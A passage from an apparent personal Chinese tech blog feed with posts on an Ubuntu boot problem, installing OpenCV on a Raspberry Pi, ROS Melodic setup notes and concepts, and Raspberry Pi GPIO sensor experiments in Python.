        <content type="html"><![CDATA[<p>难顶 啊<br>我Ubuntu进不去了 枯了<br>一直什么Couldn’t get UEFI db list<br>然后后面 UUID cannot find<br>之前因为虽然报了这个错误，但是重试几次还是可以进去系统的，今天就gg了<br>这也太难顶了，我又没备份，难不成要重装嘛？？</p><p><del>cao 不跟你搞这些幺蛾子了 直接换系统了CentOS，正好专业课也要装Hadoop在这系统上</del><br>原来CentOS不带桌面，还要自己装，还是Ubuntu了XD</p><p>就先装anaconda3 keras就可以了</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派安装OpenCV3</title>
      <link href="/blog/iot-raspberry-install-opencv/"/>
      <url>/blog/iot-raspberry-install-opencv/</url>
      
        <content type="html"><![CDATA[<h3 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h3><p>这种方式编译时间巨长，然鹅我重试了3次还是没有成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential git cmake pkg-config -y</span><br><span class="line">sudo apt-get install libjpeg8-dev -y</span><br><span class="line">sudo apt-get install libtiff5-dev -y</span><br><span class="line">sudo apt-get install libjasper-dev -y</span><br><span class="line">sudo apt-get install libpng12-dev -y</span><br><span class="line"></span><br><span class="line">sudo apt-get install libavcodec-dev libavformat-dev libswscale-dev libv4l-dev -y</span><br><span class="line"></span><br><span class="line">sudo apt-get install libgtk2.0-dev -y</span><br><span class="line">sudo apt-get install libatlas-base-dev gfortran -y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wget https://github.com/Itseez/opencv/archive/3.4.0.zip</span><br><span class="line">mv 3.4.0.zip opencv-3.4.0.zip</span><br><span class="line"></span><br><span class="line">wget https://github.com/Itseez/opencv_contrib/archive/3.4.0.zip</span><br><span class="line">mv 3.4.0.zip opencv_contrib-3.4.0.zip</span><br><span class="line"></span><br><span class="line">unzip opencv-3.4.0.zip</span><br><span class="line">unzip opencv_contrib-3.4.0.zip</span><br><span class="line"></span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></p><h3 id="pip3"><a href="#pip3" class="headerlink" title="pip3"></a>pip3</h3><p>这个方式可以说是最简单的了..<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install opencv-python</span><br></pre></td></tr></table></figure></p><p>import的时候报了一个错<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> cv2</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"/usr/local/lib/python3.7/dist-packages/cv2/__init__.py"</span>, line <span class="number">3</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> .cv2 <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure></p><p>然后全运行一遍再import就成功了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libhdf5-dev</span><br><span class="line">sudo apt-get install libatlas-base-dev</span><br><span class="line">sudo apt-get install libjasper-dev</span><br><span class="line">sudo apt-get install libqt4-test</span><br><span class="line">sudo apt-get install libqtgui4</span><br></pre></td></tr></table></figure></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://blog.csdn.net/CRAZY696/article/details/84874011" target="_blank" rel="noopener">https://blog.csdn.net/CRAZY696/article/details/84874011</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> install </tag>
            
            <tag> iot </tag>
            
            <tag> raspberry </tag>
            
            <tag> opencv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROS笔记</title>
      <link href="/blog/note-ros/"/>
      <url>/blog/note-ros/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>ROS(Robot Operating System) 机器人操作系统<br>ROS = 通信机制 + 开发工具 + 应用功能 + 生态系统</p><h2 id="ROS安装"><a href="#ROS安装" class="headerlink" title="ROS安装"></a>ROS安装</h2><p>版本 ROS Melodic Morenia<br>安装步骤<a href="http://wiki.ros.org/melodic/Installation/Ubuntu" target="_blank" rel="noopener">wiki</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># add source</span></span><br><span class="line">sudo sh -c <span class="string">'echo "deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main"&gt;/etc/apt/sources.list.d/ros-latest.list'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add key</span></span><br><span class="line">sudo apt-key adv --ketserver <span class="string">'hkp://keyserver.ubuntu.com:80'</span> --resc-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654</span><br><span class="line"></span><br><span class="line"><span class="comment"># install ros</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install ros-melodic-desktop-full</span><br><span class="line"></span><br><span class="line"><span class="comment"># init rosdep</span></span><br><span class="line">sudo resdep init</span><br><span class="line">rosdep update</span><br><span class="line"></span><br><span class="line"><span class="comment"># env</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source /opt/ros/melodic/setup.bash"</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># install rosinstall</span></span><br><span class="line">sudo apt install python-rosinstall python-rosinstall-generator python-wstool build-essential</span><br></pre></td></tr></table></figure><p>安装目录在<code>/opt/ros</code>. run <code>roscore</code><br>例程<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">roscore</span><br><span class="line">rosrun turtlesim turtlesim_node</span><br><span class="line">rosrun turtlesim turtle_teleop_key</span><br></pre></td></tr></table></figure></p><h2 id="ROS核心概念"><a href="#ROS核心概念" class="headerlink" title="ROS核心概念"></a>ROS核心概念</h2><h3 id="通信机制"><a href="#通信机制" class="headerlink" title="通信机制"></a>通信机制</h3><p>分耦合通讯结构</p><h4 id="节点和节点管理器"><a href="#节点和节点管理器" class="headerlink" title="节点和节点管理器"></a>节点和节点管理器</h4><p>节点(Node)：执行单元</p><ul><li>执行具体任务的进程、独立运行的可执行文件</li><li>不同节点可使用不同语言，可分布式运行在不同的主机</li><li>节点在系统中的名称必须唯一</li></ul><p>节点管理器(ROS Master)：控制中心</p><ul><li>为节点提供命名和注册服务</li><li>跟踪和记录话题、服务通信，辅助节点相互查找、建立连接</li><li>提供参数服务器，节点使用此服务器储存和检索运行时的参数</li></ul><h4 id="话题通信"><a href="#话题通信" class="headerlink" title="话题通信"></a>话题通信</h4><p>话题(Topic)：异步通信机制</p><ul><li>节点间用来传输数据的重要总线</li><li>使用发布/订阅模型，数据由发布者传输到订阅者，同一个话题的订阅者或发布者可以不唯一<br>消息(Message)：话题数据</li><li>具有一定的类型和数据结构，包括ROS提供的标准类型和用户自定义类型</li><li>使用编程语言无关的.msg文件定义，编译过程中生成对应的代码文件</li></ul><p>无反馈，有缓冲，节点关系多对多</p><h4 id="服务通信"><a href="#服务通信" class="headerlink" title="服务通信"></a>服务通信</h4><p>服务(Service)：同步通信机制</p><ul><li>使用客户端/服务器(C/S)模型，客户端发送请求数据，服务器完成处理后返回应答数据</li><li>使用编程语言无关的.srv文件定义请求和应答数据结构，编译过程中生成对应的代码文件</li></ul><p>有反馈，无缓冲，节点关系一对多</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>参数(Parameter) - 全局共享字典</p><ul><li>可通过网络访问的共享、多变量字典</li><li>节点使用此服务器来存储和检索运行时的参数</li><li>适合存储静态、非二进制的配置文件，不适合存储动态配置的数据</li></ul><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>功能包(Package)</p><ul><li>ROS软件中的基本单元，包含节点源码、配置文件、数据定义等</li></ul><p>功能包清单(Package manifest)</p><ul><li>记录功能包的基本信息，包含作者信息、许可信息、依赖选项、编译标志等</li></ul><p>元功能包(Meta Packages)</p><ul><li>组织多个用于同一目的的功能包</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="http://www.gyh.ai" target="_blank" rel="noopener">古月 · ROS入门21讲</a></li><li><a href="https://github.com/huchunxu/ros_21_tutorials" target="_blank" rel="noopener">https://github.com/huchunxu/ros_21_tutorials</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> ros </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派硬件相关</title>
      <link href="/blog/iot-raspberry-hardware/"/>
      <url>/blog/iot-raspberry-hardware/</url>
      
        <content type="html"><![CDATA[<h2 id="硬件基础"><a href="#硬件基础" class="headerlink" title="硬件基础"></a>硬件基础</h2><p>因为我的是树莓派Model 3B+，所以GPIO引脚一共有40个<br>布局是这个样子的<br><img src="/img/iot-raspberry-hardware/20190914161430.png" alt></p><h2 id="GPIO"><a href="#GPIO" class="headerlink" title="GPIO"></a>GPIO</h2><p>发现了一个特别好用的，入门级GPIO库，之前看RPi.GPIO给我整蒙了，这个是真的简单<br><a href="https://gpiozero.readthedocs.io/en/stable/#" target="_blank" rel="noopener">gpiozero</a></p><p>随便练了一下</p><h3 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h3><p>一开始也是不太会接线的说，但是这个库比较简单就随便接了<br>R - pin17<br>G - pin27<br>B - pin 18<br>GND - GND<br><img src="/img/iot-hardware/20190924201636.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gpiozero <span class="keyword">import</span> LED</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">ledr = LED(<span class="number">17</span>)</span><br><span class="line">ledg = LED(<span class="number">27</span>)</span><br><span class="line">ledb = LED(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    ledr.on()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    ledg.on()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    ledb.on()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    ledr.off()</span><br><span class="line">    ledg.off()</span><br><span class="line">    ledb.off()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="Button-RGB"><a href="#Button-RGB" class="headerlink" title="Button + RGB"></a>Button + RGB</h3><p>一开始是青色，按按钮变紫色，松开又是青色<br>一开始把按钮的中间的线差错位置了，中间是正极连+5V，负极连GND，另一个边上的随便连个pin，我连的17<br>RGB灯就是换了一下pin，其他跟上面一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gpiozero <span class="keyword">import</span> Button, LED</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">ledr = LED(<span class="number">18</span>)</span><br><span class="line">ledg = LED(<span class="number">27</span>)</span><br><span class="line">ledb = LED(<span class="number">22</span>)</span><br><span class="line">btn = Button(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">ledb.on()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> btn.is_pressed:</span><br><span class="line">        ledr.on()</span><br><span class="line">        ledg.off()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ledg.on()</span><br><span class="line">        ledr.off()</span><br></pre></td></tr></table></figure><h3 id="Button-RGB-laster"><a href="#Button-RGB-laster" class="headerlink" title="Button + RGB + laster"></a>Button + RGB + laster</h3><p>加了个激光玩，it’s so easy<br>接下来就要加些传感器了<br><img src="/img/iot-hardware/20190924215604.jpg" alt><br><img src="/img/iot-hardware/20190924215622.jpg" alt><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gpiozero <span class="keyword">import</span> Button, LED</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">ledr = LED(<span class="number">18</span>)</span><br><span class="line">ledg = LED(<span class="number">27</span>)</span><br><span class="line">ledb = LED(<span class="number">22</span>)</span><br><span class="line">btn = Button(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">laster = LED(<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">ledb.on()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> btn.is_pressed:</span><br><span class="line">        ledr.on()</span><br><span class="line">        ledg.off()</span><br><span class="line">        laster.on()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ledg.on()</span><br><span class="line">        ledr.off()</span><br><span class="line">        laster.off()</span><br></pre></td></tr></table></figure></p><h3 id="光敏传感器"><a href="#光敏传感器" class="headerlink" title="光敏传感器"></a>光敏传感器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gpiozero <span class="keyword">import</span> LightSensor</span><br><span class="line"></span><br><span class="line">sensor = LightSensor(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sensor.wait_for_light()</span><br><span class="line">    print(<span class="string">"It is dark!  :("</span>)</span><br><span class="line">    sensor.wait_for_dark()</span><br><span class="line">    print(<span class="string">"It is light! :)"</span>)</span><br></pre></td></tr></table></figure><h3 id="温度传感器-DS18B20"><a href="#温度传感器-DS18B20" class="headerlink" title="温度传感器 DS18B20"></a>温度传感器 DS18B20</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dtoverlay=w1-gpio-pull，gpioin=4</span><br><span class="line">sudo modprobe w1_gpio</span><br><span class="line">sudo modprobe w1_therm</span><br><span class="line">lsmode</span><br><span class="line">cat /sys/bus/w1/devices/28-011869db6fff/w1_slave</span><br><span class="line">t=25500就是25.5摄氏度</span><br><span class="line">sudo raspi-config</span><br></pre></td></tr></table></figure><h3 id="火焰传感器-气体烟雾传感器-MQ-2"><a href="#火焰传感器-气体烟雾传感器-MQ-2" class="headerlink" title="火焰传感器 气体烟雾传感器 MQ-2"></a>火焰传感器 气体烟雾传感器 MQ-2</h3><p>检测到时时输出低电压，value=1, is_active=False<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gpiozero <span class="keyword">import</span> InputDevice</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mq2 = InputDevice(<span class="number">27</span>)</span><br><span class="line">fire = InputDevice(<span class="number">22</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    print(mq2.value, mq2.is_active, fire.value, fire.is_active)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure></p><h3 id="AD-DA转换PCF8591"><a href="#AD-DA转换PCF8591" class="headerlink" title="AD/DA转换PCF8591"></a>AD/DA转换PCF8591</h3><p><code>sudo raspi-config</code> 打开<code>I2C</code>和<code>SPI</code>， 然后<br><code>sudo apt-get install i2c-tools python-smbus</code> 安装依赖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#------------------------------------------------------</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#This is a program for PCF8591 Module.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#Warnng! The Analog input MUST NOT be over 3.3V!</span></span><br><span class="line"><span class="comment">#    </span></span><br><span class="line"><span class="comment">#In this script, we use a poteniometer for analog</span></span><br><span class="line"><span class="comment">#   input, and a LED on AO for analog output.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#you can import this script to another by:</span></span><br><span class="line"><span class="comment">#import PCF8591 as ADC</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#ADC.Setup(Address)  # Check it by sudo i2cdetect -y -1</span></span><br><span class="line"><span class="comment">#ADC.read(channal)# Channal range from 0 to 3</span></span><br><span class="line"><span class="comment">#ADC.write(Value)# Value range from 0 to 255</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#------------------------------------------------------</span></span><br><span class="line"><span class="keyword">import</span> smbus</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># for RPI version 1, use "bus = smbus.SMBus(0)"</span></span><br><span class="line">bus = smbus.SMBus(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#check your PCF8591 address by type in 'sudo i2cdetect -y -1' in terminal.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(Addr)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> address</span><br><span class="line">    address = Addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(chn)</span>:</span> <span class="comment">#channel</span></span><br><span class="line">    <span class="keyword">if</span> chn == <span class="number">0</span>:</span><br><span class="line">        bus.write_byte(address,<span class="number">0x40</span>)</span><br><span class="line">    <span class="keyword">if</span> chn == <span class="number">1</span>:</span><br><span class="line">        bus.write_byte(address,<span class="number">0x41</span>)</span><br><span class="line">    <span class="keyword">if</span> chn == <span class="number">2</span>:</span><br><span class="line">        bus.write_byte(address,<span class="number">0x42</span>)</span><br><span class="line">    <span class="keyword">if</span> chn == <span class="number">3</span>:</span><br><span class="line">        bus.write_byte(address,<span class="number">0x43</span>)</span><br><span class="line">    bus.read_byte(address) <span class="comment"># dummy read to start conversion</span></span><br><span class="line">    <span class="keyword">return</span> bus.read_byte(address)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(val)</span>:</span></span><br><span class="line">    temp = val <span class="comment"># move string value to temp</span></span><br><span class="line">    temp = int(temp) <span class="comment"># change string to integer</span></span><br><span class="line">    <span class="comment"># print temp to see on terminal else comment out</span></span><br><span class="line">    bus.write_byte_data(address, <span class="number">0x40</span>, temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    setup(<span class="number">0x48</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(<span class="string">'AIN0 = '</span>, read(<span class="number">0</span>))</span><br><span class="line">        print(<span class="string">'AIN1 = '</span>, read(<span class="number">1</span>))</span><br><span class="line">        tmp = read(<span class="number">0</span>)</span><br><span class="line">        tmp = tmp*(<span class="number">255</span><span class="number">-125</span>)/<span class="number">255</span>+<span class="number">125</span> <span class="comment"># LED won't light up below 125, so convert '0-255' to '125-255'</span></span><br><span class="line">        write(tmp)</span><br><span class="line"><span class="comment">#time.sleep(0.3)</span></span><br></pre></td></tr></table></figure><p>这个文件编译一下<code>python3 -m PCF8591.py</code>，然后在<code>__pycache__</code>里面可以找到<code>.pyc</code>，移出来供下面的文件使用</p><p>输出烟雾传感器数据<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PCF8591 <span class="keyword">as</span> ADC</span><br><span class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">DO = <span class="number">17</span></span><br><span class="line">Buzz = <span class="number">18</span></span><br><span class="line">GPIO.setmode(GPIO.BCM)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">()</span>:</span></span><br><span class="line">    ADC.setup(<span class="number">0x48</span>)</span><br><span class="line">    GPIO.setup(DO, GPIO.IN)</span><br><span class="line">    GPIO.setup(Buzz, GPIO.OUT)</span><br><span class="line">    GPIO.output(Buzz,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'   *********'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'   * Safe~ *'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'   *********'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'   ***************'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'   * Danger Gas! *'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'   ***************'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop</span><span class="params">()</span>:</span></span><br><span class="line">    status = <span class="number">1</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">print</span> ADC.read(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        tmp = GPIO.input(DO);</span><br><span class="line">        <span class="keyword">if</span> tmp != status:</span><br><span class="line">            Print(tmp)</span><br><span class="line">            status = tmp</span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                GPIO.output(Buzz, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                GPIO.output(Buzz, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            GPIO.output(Buzz, <span class="number">0</span>)</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">                </span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">()</span>:</span></span><br><span class="line">    GPIO.output(Buzz, <span class="number">0</span>)</span><br><span class="line">    GPIO.cleanup()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        setup()</span><br><span class="line">        loop()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt: </span><br><span class="line">        destroy()</span><br></pre></td></tr></table></figure></p><p>接线的话，AO口接PCF的AIN0，一开始还不会接，因为我没有male-to-male的线，最后发现那上面的一个东东可以把俩female接起来=-=<br>SDA SCL就接树莓派上的SDA SCL</p><p>先这样，传感器目前也只用这些，其他的也都大同小异接线基本都提到过了，后面就是要看看RPi.GPIO的文档，gpiozero入门海星，功能太少，很多都不支持</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《树莓派开发实战(第2版)》</li></ul>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
